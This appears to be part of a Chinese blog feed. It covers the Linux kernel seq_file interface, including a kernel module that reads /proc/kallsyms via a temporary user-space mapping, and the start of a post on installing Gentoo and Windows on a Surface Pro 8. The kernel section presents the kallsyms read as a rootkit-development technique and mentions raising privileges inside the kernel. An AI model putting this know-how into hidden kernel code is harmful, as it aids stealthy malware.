class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_lseek -序列文件的 -&gt;llseek() 方法</span><br><span class="hljs-comment"> *@file: the file in question</span><br><span class="hljs-comment"> *@offset: 新的偏移值</span><br><span class="hljs-comment"> *@whence: 0 for 绝对值, 1 for 相对位置</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Ready-made -&gt;f_op-&gt;llseek()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">loff_t</span> <span class="hljs-title function_">seq_lseek</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">loff_t</span> offset, <span class="hljs-type">int</span> whence)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> file-&gt;private_data;<br><span class="hljs-type">loff_t</span> retval = -EINVAL;<br><br>mutex_lock(&amp;m-&gt;lock);<br><span class="hljs-keyword">switch</span> (whence) &#123;<br><span class="hljs-keyword">case</span> SEEK_CUR:<br>offset += file-&gt;f_pos;<br>fallthrough;<br><span class="hljs-keyword">case</span> SEEK_SET:<br><span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br>retval = offset;<br><span class="hljs-keyword">if</span> (offset != m-&gt;read_pos) &#123;<br><span class="hljs-keyword">while</span> ((retval = traverse(m, offset)) == -EAGAIN)<br>;<br><span class="hljs-keyword">if</span> (retval) &#123;<br><span class="hljs-comment">/* with extreme prejudice... */</span><br>file-&gt;f_pos = <span class="hljs-number">0</span>;<br>m-&gt;read_pos = <span class="hljs-number">0</span>;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;read_pos = offset;<br>retval = file-&gt;f_pos = offset;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>file-&gt;f_pos = offset;<br>&#125;<br>&#125;<br>mutex_unlock(&amp;m-&gt;lock);<br><span class="hljs-keyword">return</span> retval;<br>&#125;<br>EXPORT_SYMBOL(seq_lseek);<br></code></pre></td></tr></table></figure><h2 id="seq-release-：关闭序列文件"><a href="#seq-release-：关闭序列文件" class="headerlink" title="seq_release()：关闭序列文件"></a>seq_release()：关闭序列文件</h2><p>这个函数主要是进行释放内存的收尾工作，不再赘叙：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_release -free the structures associated with sequential file.</span><br><span class="hljs-comment"> *@file: file in question</span><br><span class="hljs-comment"> *@inode: its inode</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Frees the structures associated with sequential file; can be used</span><br><span class="hljs-comment"> *as -&gt;f_op-&gt;release() if you don&#x27;t have private data to destroy.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> file-&gt;private_data;<br>kvfree(m-&gt;buf);<br>kmem_cache_free(seq_file_cache, m);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL(seq_release);<br></code></pre></td></tr></table></figure><p>对于 <code>__seq_open_private()</code> ，也有一个对应的关闭函数 <code>seq_release_private()</code> ，同样是在 <code>seq_release()</code> 上的 wrapper，不过会帮你释放掉 <code>seq_file::private</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">seq_release_private</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">seq</span> =</span> file-&gt;private_data;<br><br>kfree(seq-&gt;private);<br>seq-&gt;private = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> seq_release(inode, file);<br>&#125;<br>EXPORT_SYMBOL(seq_release_private);<br></code></pre></td></tr></table></figure><blockquote><p>至此序列文件接口的实现基本完结，可以看到这个实现其实非常的简洁，这个场景在内核中其实非常常见（例如读取各种内核对象的信息），对于开发者而言并不需要每个场景都手写一套，因此通用的序列文件接口应运而生</p></blockquote><h1 id="0x03-序列文件接口-其他"><a href="#0x03-序列文件接口-其他" class="headerlink" title="0x03. 序列文件接口 - 其他"></a>0x03. 序列文件接口 - 其他</h1><p>序列文件接口其实没啥更多能讲的东西了，这一节主要记录一些比较零碎的迷思</p><h2 id="在内核中读取特殊序列文件"><a href="#在内核中读取特殊序列文件" class="headerlink" title="在内核中读取特殊序列文件"></a>在内核中读取特殊序列文件</h2><!--因为序列文件接口被开发出来的目的便是为了向用户空间导出内核数据，因此在内核空间读取序列文件在设计初期并没有被考虑到， 所以数据拷贝使用的是 AIO 接口的 `copy_to_iter()` ，**仅用来将数据从内核空间拷贝到用户空间** ，因此你无法通过 `kernel_read()` 这样的 API 来读取这类文件--><p>部分的序列文件接口对于内核空间是不可以使用 <code>kernel_read()</code> 进行读取的，因为其文件函数表实现的是 <code>read()</code> 接口而非 <code>read_iter()</code> 接口，但是实战开发中我们往往又需要在内核空间读取一些序列文件，这通常是因为这一部分内核数据的获取接口并不对内核驱动导出，但留有向用户空间导出的序列文件接口，此时序列文件接口便几乎是我们唯一的数据获取方式</p><blockquote><p>例如在 rootkit 开发当中我们通常需要获取各种内核符号的地址，但对应的获取内核符号的内核接口 <code>kallsyms_lookup_name()</code> 在内核版本 <code>5.7.0</code> 后默认不再导出，因此我们只能通过读取 <code>/proc/kallsyms</code>  进行获取</p></blockquote><p>解决的方案其实很简单： <strong>我们只需要分配一块属于用户空间的临时内存即可</strong> ，这可以通过 <code>vm_mmap() &amp; vm_munmap()</code> 完成，下面是一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mman.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>;</span><br>    <span class="hljs-type">char</span> __user *ubuf;<br>    <span class="hljs-type">char</span> *kbuf;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">ssize_t</span> read_len;<br>    <span class="hljs-type">loff_t</span> fpos;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    ubuf = (<span class="hljs-type">void</span>*) vm_mmap(<span class="hljs-literal">NULL</span>,<br>                           <span class="hljs-number">0</span>,<br>                           PAGE_SIZE,<br>                           PROT_READ | PROT_WRITE,<br>                           MAP_ANONYMOUS | MAP_PRIVATE,<br>                           <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!ubuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to allocate userspace buf!\n&quot;</span>);<br>        ret = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> out_ret;<br>    &#125;<br><br>    filp = filp_open(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (IS_ERR(filp)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to open file! Error code: %ld\n&quot;</span>,<br>               PTR_ERR(filp));<br>        ret = PTR_ERR(filp);<br>        <span class="hljs-keyword">goto</span> out_free_ubuf;<br>    &#125;<br><br>    kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!kbuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to allocate kernelspace buf!\n&quot;</span>);<br>        ret = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(kbuf, <span class="hljs-number">0</span>, PAGE_SIZE);<br><br>    fpos = <span class="hljs-number">0</span>;<br>    read_len = filp-&gt;f_op-&gt;read(filp, ubuf, PAGE_SIZE, &amp;fpos);<br>    filp-&gt;f_pos = fpos;<br>    <span class="hljs-keyword">if</span> (read_len &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to read file! Error code: %ld\n&quot;</span>,<br>              read_len);<br>        ret = read_len;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (copy_from_user(kbuf, ubuf, read_len)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to copy data to kernel!\n&quot;</span>);<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Got data: %s\n&quot;</span>, kbuf);<br><br>out_close_file:<br>    filp_close(filp, <span class="hljs-literal">NULL</span>);<br>out_free_ubuf:<br>    vm_munmap((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ubuf, PAGE_SIZE);<br>out_ret:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>成功读取 <code>/proc/kallsyms</code> 文件：</p><p><img src="https://s2.loli.net/2024/06/03/juGzqY8l1DJUeiK.png"></p><blockquote><p>注意到这里我们读取的数据似乎不太对？这实际上是因为权限不足的缘故（在 sudo insmod 下我们的主体凭证虽然提升到了 root，但是与文件权限相关的客体凭证不与 sudo 相关联，因此在打开文件之前我们需要 <strong>在内核中手动进行提权</strong> ，完成读取后再降回原权限（可选）</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;真是序序又列列啊，你们有没有这样的文件接口啊我想问&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="https://arttnba3.github.io/categories/OS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="文件系统" scheme="https://arttnba3.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="序列文件接口" scheme="https://arttnba3.github.io/tags/%E5%BA%8F%E5%88%97%E6%96%87%E4%BB%B6%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>【DISTRO.0x02】在 Surface Pro 8 上安装 Gentoo</title>
    <link href="https://arttnba3.github.io/2024/04/30/DISTRO-0X02-SURFACE_INSTALL_GENTOO_WINDOWS/"/>
    <id>https://arttnba3.github.io/2024/04/30/DISTRO-0X02-SURFACE_INSTALL_GENTOO_WINDOWS/</id>
    <published>2024-04-29T19:23:41.000Z</published>
    <updated>2025-03-14T18:49:50.961Z</updated>
    
    <content type="html"><![CDATA[<p>Gentoo 和 openSUSE Tumbleweed 相比，那我还是觉得我们 Gentoo 牛批</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>熟悉的废话环节，可以直接跳过不看：）</p></blockquote><p>熟悉笔者的朋友都知道笔者是一个微软死忠粉（ <del>虽然这位微软死忠粉现在并没有在将由微软开发的操作系统作为主力</del> ），因此手上自然而然会有一些 Surface 设备（当然绝大部分都出二手回血了，👴只能说学生时代缺钱的穷 b 是这样的），恰好笔者手边有一台闲置的 Surface Pro 8 设备，而 Surface 从这一代设备开始有一个支持方便快捷地自行更换硬盘的设计，同时笔者原有的设备是最低配的版本 （8G 运存 + 128G 存储），因此笔者就想把这台陪伴了笔者大四期间多个夜晚的设备（因为晚上宿舍断电，所以有这样一台续航长的办公本还是很重要的， <del>当然这里肯定有人要问为什么不用 macbook 了，虽然说 mac 的续航时间确实比 Windows 阵营任何的笔记本要长得多，但是笔者当时并没有钱能够买得起哪怕是一台二手的 macbook，而且既然都买 macbook 了再买二手未免有些寒碜，可能有人又会抬杠说 Surface 都买了怎么买不起 macbook，毕竟最低配的 Surface 价格终究是比最低配的 macbook 要便宜不少，同时还有一个比较重要的原因便是笔者此前很多工作还是需要在 X86 平台上完成，mac 下虽然有 Rosetta 或是 Parallel，但是转译终究还是会带来一定的性能损耗，而且使用起来并不优雅，那这里可能又会有人问为什么不买联想或是其他牌子的同价位办公本，那👴只能说田牌就是信仰</del> ）给简单升级一下，在替换大容量硬盘的同时顺便装一个 Windows + Linux 双系统，<strong>前者是为了保留原汁原味的 Surface 体验，后者则是纯粹为了瞎折腾</strong>：）</p><p>出于各种因素的考虑（ <del>可能是偷工减料</del> ）微软为 Surface Pro 选用了 2230 规格的 SSD，这个规格的 SSD 并不好找，尤其是笔者目前肉身位于地大物穷的位于大洋彼岸离所有国家都很远的澳洲，找了半天<a href="https://cplonline.com.au/micron-mtfdkbk2t0qfm-1bd1aabyyr-2400-2tb-m-2-2230-nvme-ssd.html">才在 CPL 上找到一款镁光的 2230 规格的 2TB SSD</a>，虽然商品页面写着 <code>NOT Compatible with Surface Pro 8/9</code> ，但是<strong>在笔者看来理论上来说不兼容的情况不太可能发生</strong>，同时笔者在微软社区上找到了 <a href="https://answers.microsoft.com/en-us/surface/forum/all/what-is-the-max-ssd-my-surface-pro8-will-accept/4cf1ff6d-0bb8-415a-a4b9-690e31808f34">一篇成功在 Surface Pro 8 上安装这一款 SSD 的帖子</a>，那“不兼容”一说想来应当是无稽之谈（又或者是微软的商业手段，因为这样你就不会去买便宜硬盘了，而会屈服于微软官方商城贵得要死性价比极低的官方贴牌硬盘，<strong>而事实证明 Micron 的这块 SSD 确实是可以兼容的</strong>），因此笔者选了一个风和日丽 <del>但其实下着细雨</del> 的日子前往墨尔本的某家 CPL 线下门店取到了这款 SSD （ <del>是的这就是发达国家比较常见的购物方式，没有国内那样发达的物流网络说实话👴感觉买啥都不方便，当然出来活动活动筋骨也是好的，不过更主要的还有一点就是配送费太贵了</del> ）</p><p><img src="https://s2.loli.net/2024/04/27/q3giJxNV9ZpvrIS.png" alt="价格比国内贵上好几百 RMB，澳洲的大部分电子产品都是如此"></p><p>接下来是对系统发行版的选择，Windows 自然不用说直接装最新的 Win 11，那么 Linux 该选择哪一种发行版呢？首先考虑比较贴近上游的 Linux 发行版——</p><ul><li>出于瞎折腾的角度考虑 <code>Arch Linux</code> 自然是提供了一定的折腾空间以及 AUR 的海量软件包，在为系统带来极高的可定制性的同时你几乎可以在 AUR 上找到任何软件</li><li><code>Fedora Workstation</code> 作为 RHEL 的试验田同时也是 Linus 所用的发行版在紧贴上游的同时提供了不弱于 Arch 的先进性，有着来自红帽的强大技术支持，软件更新比一部分滚动发行版还要激进，  <del>更是能第一时间当 RedHat 的小白鼠</del></li><li><code>openSUSE Tumbleweed</code> 则有着 SUSE 那来自德国人的精确与严谨，在兼顾稳定性的同时保持了滚动更新紧贴上游（更有着 Slowroll 这样等着 Tumbleweed 滚稳了再更新的“慢滚”发行版），YaST 更像一个温柔的大姐姐一样能帮你轻松解决相当多的各类需求， <em>因此这也是笔者的主力笔记本所使用的 Linux 发行版</em></li></ul><p><img src="https://s2.loli.net/2024/04/30/62x7yCpgKwqOYHj.png" alt="熟悉笔者的都知道笔者一直都是 SUSE 批.jpg"></p><p>虽然这些都是笔者比较喜欢的发行版，但思来想去笔者还是决定安装一个不太常规的 Linux 发行版—— <a href="https://gentoo.org/">Gentoo Linux</a> ，最直接的原因就是<strong>这是一个少有的原生从源码安装软件包的滚动 Linux 发行版</strong> ，任何软件都需要自行在自己的机器上进行编译，<strong>这意味着所有人的软件的二进制包都是不一样的</strong>，虽然说这与目前软工业界所追求的<a href="https://en.wikipedia.org/wiki/Reproducible_builds">“逐位可重复构建”</a> 似乎完全背道而驰，但从软件安全的角度考虑这意味着 <em>哪怕你知道我的电脑上的某个软件中存在二进制漏洞，你也无法直接通过传统的常规 pwn 手法进行攻击</em>  ，这主要是出于一个原因： <strong>现有的漏洞利用方法通常是控制流劫持导向的，针对软件二进制漏洞利用的方式通常是劫持控制流后再利用软件中原有的代码片段构建执行链完成任意代码执行</strong> ，例如现在针对不同程序的不同版本中存在的某一漏洞进行攻击的办法通常是辨别目标软件版本后利用 ROPgadget 或是其他的一些工具来拼凑 ROP chain ，而这样的攻击方法的可行性得以成立的原因则是包括内核在内的软件二进制通常是由软件源侧完成编译后再分发给用户，这意味着在同一发行版上使用同一版本软件的用户所持有的二进制文件都是相同的，因此对于攻击者而言获取相应软件的二进制文件基本上是没什么难度的， <strong>而所有软件都自行编译则可以很大程度上加大攻击者在传统攻击面的攻击难度</strong> ——这在很大程度上满足了笔者的精神洁癖：）</p><blockquote><p>当然可能有人会抬杠说这没什么意义，毕竟现在 <a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">exploit technique 前沿都在各种 data-only attack</a> ，仅是阻挡攻击者获取 code gadget 的方式是无法完成 100% 的防护的， 可能也有人会抬杠说 <a href="https://www.intel.com/content/dam/develop/external/us/en/documents/catc17-introduction-intel-cet-844137.pdf">把 CET 开上不就完事了</a> ， <strong>但对笔者而言能有一定程度的提升那就是有意义的，在笔者看来这并非仅有 0 和 100 的区别</strong> ，同时对于攻击者而言针对所有软件都单独开发 data-only 的攻击手法未免成本就太高了，目前的这类研究还仅集中在操作系统内核或是其他大型软件上</p><p>此外，形如 <a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">CFI</a> 这样的防御手法在发行版分发的二进制软件包中很多都是未必开启的，而 Gentoo 这样自定义软件编译选项的发行版可以让你快速在系统各个软件中应用这些防护手段，同时定制自己所想要的优化选项，可能不是最好的，但是<strong>从精神层面而言一定是最适合自己的</strong></p><p> 那又有人可能会说每个开源软件都自己手工拉源码编译不就好了干嘛一定要用 Gentoo，笔者的评价是：</p><p><img src="https://s2.loli.net/2024/05/09/EfglUGYtAqpTSmz.png" alt="男人，什么罐头我说，曼巴出去"> </p></blockquote><p>当然，除了<strong>可以基于自身需求高度定制</strong>这个核心动机以外，Gentoo 有着一个强大的包管理器：<a href="https://wiki.gentoo.org/wiki/Portage">Portage</a> ，通过配置 <code>USE flag</code> 可以按照需求去编译软件包，实现 <strong>如无必要，勿增实体</strong> 的哲学（例如你需要使用的部分软件带有 kde 支持，但你其实并不使用 kde，那么只需要在 <code>/etc/portage/make.conf</code> 中添加 <code>USE=&quot;-kde&quot;</code>  这一 flag，这是一个全局性的例子；又或者对于某些软件包你想要启用&#x2F;禁止某些支持而并不想要把这样的配置全局化，你只需要在 <code>/etc/portage/package.use</code> 目录下创建新配置文件来为指定程序声明 USE 标记，例如 <code>kde-plasma/plasma-meta qt5 -sddm</code> 将为 KDE Plasma 桌面编译上 QT 支持的同时不使用 SDDM；当然，<a href="https://blog.xupeng.me/2006/10/10/met-problem-of-circular-dependencies-with-gentoo/">滥用 USE flags 有可能会来带循环依赖的问题</a>，那这又是另外一件事情了…）， <a href="https://wiki.gentoo.org/wiki/Selected-packages_set_(Portage)">world file</a> 的存在也大幅增添了系统的可重复构建性（硬要说的话在可复现性上肯定比不过 NixOS，但笔者对于 NixOS 这类“不可变系统”的概念说实话不太感冒，反倒觉得对于桌面用户而言这增添了不少没必要的麻烦，不过多学习一门 DSL 倒其实是无所谓的事情，毕竟 reproducible 的体验某种程度上真的很香，但 NixOS 对于笔者而言还有一点劝退的便是 non-FHS compliance ，虽然说 NixOS 可用的软件包确实是数一数二的多，但这样的系统构造在笔者看来并不够优雅）</p><p>最重要的是，<a href="https://en.wikipedia.org/wiki/Richard_Stallman">Richard Stallman</a> 曾经说过（ <del>实际上没说过</del> ）：Install Gentoo——</p><p><img src="https://s2.loli.net/2024/04/30/jEKw7bCOu9rMhlD.png" alt="虽然他用的不是 Gentoo 而是 Trisquel.jpg"></p><p>于是在经历了各种思考之后，笔者最终选择在 Surface Pro 上尝试折腾一下 Gentoo Linux 这一个相对而言比较小众的发行版</p><h1 id="0x01-安装-Windows"><a href="#0x01-安装-Windows" class="headerlink" title="0x01. 安装 Windows"></a>0x01. 安装 Windows</h1><p>因为笔者是要用一块全新的硬盘替换掉原有的硬盘，因此系统安装需要重头开始（ <del>虽然实际上有一些已知的系统迁移方案，但是👴太懒了</del> ），因为 Windows 很容易对硬盘分区进行预期外的修改，所以在安装双系统的情况下笔者选择先安装 Windows 再安装 Linux</p><h2 id="替换硬盘"><a href="#替换硬盘" class="headerlink" title="替换硬盘"></a>替换硬盘</h2><p>因为我们后面安装 Linux 要关闭 Secure Boot，因此我们首先需要在设置中关闭 BitLocker，从而确保原硬盘的可用性</p><blockquote><p> 否则后面就只能上 <a href="https://aka.ms/myrecoverykey">https://aka.ms/myrecoverykey</a> 找原有密钥进行恢复了，如果没有登录过微软账户的话那就只能和原硬盘数据<strong>彻底说再见了</strong>……</p></blockquote><p><img src="https://s2.loli.net/2024/04/24/tIUp49yHldzxkm2.png" alt="这个过程会非常慢，因为 Surface 设备的性能极其拉胯"></p><p>接下来进 UEFI 中关闭 Secure Boot，在关机状态下按住音量增加键不动，之后再按一次电源键即可进入 Surface 的 UEFI 界面，找到 <code>Secure Boot Configuration</code> 选择 <code>None</code> 即可：</p><p><img src="https://s2.loli.net/2024/04/24/q8MC6dsJ5HN3ToX.png" alt="u1s1 Surface 的 UEFI 虽然简介但是凑凑的"></p><p>解锁之后每次开机都会显示一个大大的红色条和一个🔓：</p><p><img src="https://s2.loli.net/2024/04/24/eJkMLOUzrG8NAvl.jpg" alt="丑中丑设计，感觉不如把🔓放在 Win logo 旁边并排"></p><p>然后在关机状态下用手机取卡针在背面的小孔一戳就能更换硬盘了，从 Surface Pro 8 开始微软的设备有了一定的可维护性，不过需要注意的是硬盘螺丝的规格为不太常见的 <code>T3</code> 六角螺丝，以及在完成硬盘更换之后 <strong>需要插电才能开机</strong> ，不过无论是通过 surface connect 还是通过雷电 4 接口插电都是可行的</p><p><img src="https://s2.loli.net/2024/04/27/iQEMbORa8qcP12j.jpg" alt="当然，你也可以选择使用牙签"></p><blockquote><p>然而仅限于 Surface Pro 系列，也就是只有 Pro 8&#x2F;9&#x2F;10（在笔者编写此文时，Pro 10 仅有商业版） 能快捷更换硬盘，Laptop 等其他产品线依然需要繁琐的拆机流程，不过这个便捷拆解设计在笔者看来有点类似之前见过的 ThinkPad 的高端工作站才有的特性🤔 遗憾的是微软如今依然尚未支持更换内存条，<del>否则👴将成为微软的铁血卫士</del></p></blockquote><h2 id="使用-PE-启动盘进行安装"><a href="#使用-PE-启动盘进行安装" class="headerlink" title="使用 PE 启动盘进行安装"></a>使用 PE 启动盘进行安装</h2><blockquote><p>Windows ISO 在 <a href="https://www.microsoft.com/software-download/windows11">微软官网</a> 便能进行下载，这里就不再赘叙了</p></blockquote><p>接下来我们在可移动磁盘（如 U 盘、移动硬盘等设备）上创建 Windows 安装介质，不过由于官网下载的 ISO 镜像缺少了分区表，因此我们需要手动进行配置，在 Windows 上你可以很轻松地使用 <a href="https://rufus.ie/en/">RUFUS</a> 一类的工具完成这一工作，若你和笔者一样日常使用 Linux 作为工作系统，则暂时没有比较好的解决方案</p><p>不过好在使用 PE 启动盘进行安装已经是一个较为成熟的解决方案了，方便起见笔者选择直接使用现有的解决方案进行安装：）</p><p>需要注意的是在这个阶段<strong>触控屏和原装键盘触摸板都是无法使用的，你必须外接键鼠进行使用</strong></p><p><img src="https://s2.loli.net/2024/04/29/RJF6nfCQYvLuesG.png" alt="笔者很久以前自制的启动盘，事实证明这些工具虽然老但是都还挺好用"></p><p>之后就是正常进系统了，不过在更新完成之前<strong>原装键盘触摸板依旧用不了</strong>：</p><p><img src="https://s2.loli.net/2024/04/29/s851nuVo43KpmWj.jpg"></p><h2 id="Extra-手工创建安装介质（not-recommended）"><a href="#Extra-手工创建安装介质（not-recommended）" class="headerlink" title="Extra. 手工创建安装介质（not recommended）"></a>Extra. 手工创建安装介质（not recommended）</h2><p>如果你希望自己动手丰衣足食，则也可以参照这一节的内容，不过笔者不太推荐（<strong>比较浪费时间</strong>）</p><blockquote><p>主要原因是 Windows 安装镜像中并没有提供一个分区表，否则直接 <code>dd</code> 一把梭就好了：(</p></blockquote><p>首先使用 <code>parted</code> 新建分区，这里我们建立一个 GPT 分区表，并建立两个分区：</p><ul><li>一个 NTFS 分区：存放 Windows 安装镜像中的文件</li><li>一个 EFI 分区：存放<a href="https://github.com/pbatard/rufus/blob/master/res/uefi/uefi-ntfs.img">由 RUFUS 提供的 EFI 启动程序</a></li></ul><blockquote><p>为什么我们不选择直接拷贝 Win 镜像进 EFI 分区？虽然 Win 镜像本身便是一个可启动的 EFI 分区，但是其安装文件 <code>source/install.wim</code> 通常大于 UEFI specs 所支持的 